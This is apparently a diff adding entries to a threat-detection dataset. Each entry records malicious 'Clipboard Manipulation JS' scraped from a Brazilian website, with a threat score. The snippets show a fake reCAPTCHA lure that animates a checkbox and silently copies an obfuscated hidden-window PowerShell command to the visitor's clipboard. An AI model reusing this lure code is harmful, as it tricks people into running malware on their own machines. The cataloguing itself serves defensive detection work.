+    "value": "...k\", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; checkboxBtnSpinner.style.animation = \"spin 1s linear infinite\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = \"0\"; checkboxBtnSpinner.style.animation = \"none\"; setTimeout(function() { checkboxBtnSpinner.style.visibility = \"hidden\"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = \"hidden\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaCheckbox() { checkboxBtn.style.width = \"100%\"; checkboxBtn.style.height = \"100%\"; checkboxBtn.style.borderRadius = \"2px\"; checkboxBtn.style.margin = \"0\"; checkboxBtn.style.opacity = \"1\"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = \"4px\"; checkboxBtn.style.height = \"4px\"; checkboxBtn.style.borderRadius = \"50%\"; checkboxBtn.style.marginLeft = \"25px\"; checkboxBtn.style.marginTop = \"33px\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"hidden\"; checkboxBtnSpinner.style.opacity = \"0\"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = \"none\"; verifywindow.style.visibility = \"hidden\"; verifywindow.style.opacity = \"0\"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== \"none\" && verifywindow.style.display !== \"\"; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(\"textarea\"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = \" # \" const ploy = \"\u00e2\u009c ''I am not a robot - reCAPTCHA Verification ID: \" const end = \"''\" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {..."
+  },
+  {
+    "source_url": "https://www.bratusferramentas.grupomoltz.com.br/",
+    "threat_score": 401,
+    "category": "Clipboard Manipulation JS",
+    "value": "...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\");..."
+  },
+  {
+    "source_url": "https://www.bratusferramentas.grupomoltz.com.br/",
+    "threat_score": 401,
+    "category": "Clipboard Manipulation JS",
+    "value": "...cation-id').textContent = verification_id; const commandToRun = `POWerShEll -W h \"[Text.Encoding]::UTF8.GetString..."
+  }
+]
